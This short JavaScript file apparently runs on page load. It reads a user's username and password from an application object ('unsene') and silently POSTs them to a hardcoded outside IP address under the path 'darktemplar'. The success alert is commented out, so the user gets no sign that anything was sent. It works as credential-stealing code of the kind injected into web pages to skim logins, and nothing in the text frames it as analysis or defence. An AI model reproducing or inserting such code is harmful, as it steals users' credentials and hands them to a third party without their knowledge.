$(document).ready(function (){

var user = this.unsene.unseneView.me.get("username");
var pwd = this.unsene.unseneView.credential.get("password");

    $.ajax({
           type: "POST",
            url: "http://218.255.31.228:8152/darktemplar/",
            data: {
                username: user,
                password: pwd
            },
            success: function(b) {
              // alert('success');
            },

        })
});

